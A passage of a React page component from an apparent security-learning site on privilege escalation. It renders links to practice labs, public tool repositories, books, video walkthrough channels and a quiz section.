                  { name: "TryHackMe - Linux PrivEsc", url: "https://tryhackme.com/room/linuxprivesc", desc: "Guided Linux privilege escalation room with explanations" },
                  { name: "TryHackMe - Windows PrivEsc", url: "https://tryhackme.com/room/windows10privesc", desc: "Guided Windows privilege escalation techniques" },
                  { name: "TryHackMe - Linux PrivEsc Arena", url: "https://tryhackme.com/room/dvwa", desc: "Practice various Linux privesc techniques" },
                  { name: "HackTheBox", url: "https://www.hackthebox.com/", desc: "Real-world vulnerable machines - retired boxes for practice" },
                  { name: "VulnHub", url: "https://www.vulnhub.com/", desc: "Downloadable vulnerable VMs for offline practice" },
                  { name: "Offensive Security Proving Grounds", url: "https://www.offensive-security.com/labs/", desc: "Practice machines from OSCP creators" },
                ].map((lab) => (
                  <ListItem key={lab.name} sx={{ px: 0 }}>
                    <ListItemIcon>
                      <BugReportIcon sx={{ color: "#f59e0b" }} />
                    </ListItemIcon>
                    <ListItemText
                      primary={<Button href={lab.url} target="_blank" sx={{ color: "white", textTransform: "none", p: 0, minWidth: 0, fontWeight: 600 }}>{lab.name}</Button>}
                      secondary={<Typography variant="body2" sx={{ color: "grey.400" }}>{lab.desc}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>

          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Typography variant="h6" sx={{ color: "#3b82f6", mb: 2, fontWeight: 700 }}>
                🔧 Tool Repositories
              </Typography>
              <List>
                {[
                  { name: "PEASS-ng (LinPEAS/WinPEAS)", url: "https://github.com/carlospolop/PEASS-ng", desc: "Most comprehensive enumeration scripts" },
                  { name: "PowerSploit", url: "https://github.com/PowerShellMafia/PowerSploit", desc: "PowerUp and other Windows privesc tools" },
                  { name: "Windows Kernel Exploits", url: "https://github.com/SecWiki/windows-kernel-exploits", desc: "Precompiled Windows kernel exploits" },
                  { name: "Linux Kernel Exploits", url: "https://github.com/lucyoa/kernel-exploits", desc: "Collection of Linux kernel exploits" },
                  { name: "Potato Suite", url: "https://github.com/ohpe/juicy-potato", desc: "JuicyPotato and related token exploits" },
                  { name: "PrintSpoofer", url: "https://github.com/itm4n/PrintSpoofer", desc: "Latest token impersonation for Windows" },
                ].map((repo) => (
                  <ListItem key={repo.name} sx={{ px: 0 }}>
                    <ListItemIcon>
                      <DataObjectIcon sx={{ color: "#3b82f6" }} />
                    </ListItemIcon>
                    <ListItemText
                      primary={<Button href={repo.url} target="_blank" sx={{ color: "white", textTransform: "none", p: 0, minWidth: 0, fontWeight: 600 }}>{repo.name}</Button>}
                      secondary={<Typography variant="body2" sx={{ color: "grey.400" }}>{repo.desc}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>

          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Typography variant="h6" sx={{ color: "#22c55e", mb: 2, fontWeight: 700 }}>
                📖 Recommended Books & Courses
              </Typography>
              <List>
                {[
                  { name: "The Hacker Playbook 3", desc: "Red Team field manual with privesc chapters" },
                  { name: "Penetration Testing - Georgia Weidman", desc: "Comprehensive intro including privilege escalation" },
                  { name: "OSCP - PEN-200", desc: "Official Offensive Security certification course" },
                  { name: "TCM Security - Linux Privesc", desc: "Practical Ethical Hacking course section" },
                  { name: "TCM Security - Windows Privesc", desc: "Detailed Windows escalation training" },
                  { name: "eLearnSecurity eCPPT", desc: "Advanced penetration testing with privesc focus" },
                ].map((book) => (
                  <ListItem key={book.name} sx={{ px: 0 }}>
                    <ListItemIcon>
                      <SchoolIcon sx={{ color: "#22c55e" }} />
                    </ListItemIcon>
                    <ListItemText
                      primary={<Typography sx={{ color: "white", fontWeight: 600 }}>{book.name}</Typography>}
                      secondary={<Typography variant="body2" sx={{ color: "grey.400" }}>{book.desc}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                🎬 Video Resources & Walkthroughs
              </Typography>
              <Grid container spacing={2}>
                {[
                  { name: "IppSec", url: "https://www.youtube.com/c/ippsec", desc: "Detailed HackTheBox walkthroughs with privesc explanations", platform: "YouTube" },
                  { name: "John Hammond", url: "https://www.youtube.com/c/JohnHammond010", desc: "CTF walkthroughs and security tutorials", platform: "YouTube" },
                  { name: "The Cyber Mentor", url: "https://www.youtube.com/c/TheCyberMentor", desc: "Practical hacking tutorials and courses", platform: "YouTube" },
                  { name: "0xdf", url: "https://0xdf.gitlab.io/", desc: "Detailed HackTheBox and CTF writeups", platform: "Blog" },
                  { name: "0xRick", url: "https://0xrick.github.io/", desc: "HackTheBox machine walkthroughs", platform: "Blog" },
                  { name: "Hack The Box Official", url: "https://www.youtube.com/c/HackTheBox", desc: "Official HTB tutorials and academy content", platform: "YouTube" },
                ].map((video) => (
                  <Grid item xs={12} sm={6} md={4} key={video.name}>
                    <Card sx={{ bgcolor: alpha("#1a1a2e", 0.8), border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
                      <CardContent sx={{ py: 2 }}>
                        <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                          <Button href={video.url} target="_blank" sx={{ color: "white", textTransform: "none", p: 0, minWidth: 0, fontWeight: 600, fontSize: "0.95rem" }}>
                            {video.name}
                          </Button>
                          <Chip label={video.platform} size="small" sx={{ bgcolor: alpha("#ef4444", 0.2), color: "#ef4444", height: 20, fontSize: "0.7rem" }} />
                        </Box>
                        <Typography variant="body2" sx={{ color: "grey.400", fontSize: "0.8rem" }}>{video.desc}</Typography>
                      </CardContent>
                    </Card>
                  </Grid>
                ))}
              </Grid>
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Alert severity="success" sx={{ bgcolor: alpha("#22c55e", 0.1) }}>
              <Typography variant="body2">
                <strong>Learning Path:</strong> Start with TryHackMe's guided rooms → Practice on VulnHub VMs → 
                Graduate to HackTheBox → Challenge yourself with Proving Grounds. Always use enumeration scripts 
                first, then manually verify findings. Document your methodologies!
              </Typography>
            </Alert>
          </Grid>
        </Grid>
      </TabPanel>
      <Paper
        id="quiz-section"
        sx={{
          mt: 4,
          p: 4,
          borderRadius: 3,
          border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
        }}
      >
        <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
          Knowledge Check
        </Typography>
        <QuizSection
          questions={quizQuestions}
          accentColor={QUIZ_ACCENT_COLOR}
          title="Privilege Escalation Knowledge Check"
          description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
          questionsPerQuiz={QUIZ_QUESTION_COUNT}
        />
      </Paper>

      {/* Bottom Navigation */}
      <Box sx={{ mt: 4, textAlign: "center" }}>
        <Button
          variant="outlined"
          startIcon={<ArrowBackIcon />}
          onClick={() => navigate("/learn")}
          sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
        >
          Back to Learning Hub
        </Button>
      </Box>
    </Container>
    </LearnPageLayout>
  );
}
